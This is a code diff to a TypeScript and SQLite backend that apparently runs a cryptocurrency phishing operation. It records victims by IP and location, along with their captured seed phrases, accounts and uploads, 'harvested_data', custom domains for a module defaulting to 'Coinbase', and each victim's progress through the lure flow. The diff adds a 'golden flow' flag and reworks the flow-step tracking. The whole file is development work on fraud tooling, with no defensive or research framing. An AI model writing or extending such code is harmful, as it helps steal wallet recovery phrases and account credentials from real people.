@@ -334,6 +334,7 @@ function migrate(db: Database.Database): void {
 	addColumnIfMissing(db, 'visitors', 'email_from', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'visitors', 'email_to', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'visitors', 'flow_steps', "TEXT NOT NULL DEFAULT ''");
+	addColumnIfMissing(db, 'visitors', 'is_golden_flow', "INTEGER NOT NULL DEFAULT 1");
 	addColumnIfMissing(db, 'harvested_data', 'captured_by', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'user_accounts', 'password_hash', "TEXT NOT NULL DEFAULT ''");
 	addColumnIfMissing(db, 'custom_domains', 'module', "TEXT NOT NULL DEFAULT 'Coinbase'");
@@ -469,8 +470,8 @@ export function dbUpsertVisitor(v: Visitor): void {
 	const flowStepsJson = v.flowSteps?.length ? JSON.stringify(v.flowSteps) : '';
 	getDb()
 		.prepare(
-			`INSERT INTO visitors (ip, flag, city, region, country, status, flow, last_seen, connected_at, phrases, accounts, uploads, platform, device, email, module, user_id, user_agent, browser, last_page_route, flow_bypassed, captured_by, last_two_digits, email_from, email_to, flow_steps)
-			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+			`INSERT INTO visitors (ip, flag, city, region, country, status, flow, last_seen, connected_at, phrases, accounts, uploads, platform, device, email, module, user_id, user_agent, browser, last_page_route, flow_bypassed, is_golden_flow, captured_by, last_two_digits, email_from, email_to, flow_steps)
+			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
 			 ON CONFLICT(ip) DO UPDATE SET
 				flag=excluded.flag, city=excluded.city, region=excluded.region, country=excluded.country,
 				status=excluded.status, flow=excluded.flow, last_seen=excluded.last_seen,
@@ -478,7 +479,8 @@ export function dbUpsertVisitor(v: Visitor): void {
 				uploads=excluded.uploads, platform=excluded.platform, device=excluded.device,
 				email=excluded.email, module=excluded.module, user_id=excluded.user_id,
 				user_agent=excluded.user_agent, browser=excluded.browser, last_page_route=excluded.last_page_route,
-				flow_bypassed=excluded.flow_bypassed, captured_by=excluded.captured_by, last_two_digits=excluded.last_two_digits,
+				flow_bypassed=excluded.flow_bypassed, is_golden_flow=excluded.is_golden_flow,
+				captured_by=excluded.captured_by, last_two_digits=excluded.last_two_digits,
 				email_from=excluded.email_from, email_to=excluded.email_to, flow_steps=excluded.flow_steps`
 		)
 		.run(
@@ -487,14 +489,19 @@ export function dbUpsertVisitor(v: Visitor): void {
 			v.uploads, v.platform, v.device,
 			v.email || '', v.module || 'Coinbase', v.userId || '', v.userAgent || '',
 			v.browser || '', v.lastPageRoute || '', v.flowBypassed ? 1 : 0,
+			v.isGoldenFlow ? 1 : 0,
 			v.capturedBy || '', v.lastTwoDigits || '',
 			v.emailFrom || '', v.emailTo || '', flowStepsJson
 		);
 }
 
-export function dbSetVisitorFlowSteps(ip: string, steps: { page: string; passed: boolean }[]): void {
+export function dbSetVisitorFlowSteps(ip: string, steps: { page: string; status?: string; passed?: boolean }[]): void {
 	const json = steps?.length ? JSON.stringify(steps) : '';
 	getDb().prepare('UPDATE visitors SET flow_steps = ? WHERE ip = ?').run(json, ip);
+}
+
+export function dbSetVisitorGoldenFlow(ip: string, isGolden: boolean): void {
+	getDb().prepare('UPDATE visitors SET is_golden_flow = ? WHERE ip = ?').run(isGolden ? 1 : 0, ip);
 }
 
 export function dbDeleteVisitor(ip: string): void {
@@ -602,7 +609,15 @@ function rowToVisitor(row: any): Visitor {
 			if (!row.flow_steps) return [];
 			try {
 				const parsed = JSON.parse(row.flow_steps);
-				return Array.isArray(parsed) ? parsed : [];
+				if (!Array.isArray(parsed)) return [];
+				return parsed.map((s: any) => {
+					if (s.status) return s;
+					return {
+						page: s.page,
+						status: s.passed ? 'completed' : 'not_started',
+						completedAt: s.passed ? (s.completedAt || 0) : undefined
+					};
+				});
 			} catch {
 				return [];
 			}
@@ -619,6 +634,7 @@ function rowToVisitor(row: any): Visitor {
 		userId: row.user_id || '',
 		userAgent: row.user_agent || '',
 		flowBypassed: !!row.flow_bypassed,
+		isGoldenFlow: row.is_golden_flow !== undefined ? !!row.is_golden_flow : true,
 		capturedBy: row.captured_by || '',
 		lastTwoDigits: row.last_two_digits || '',
 		emailFrom: row.email_from || '',
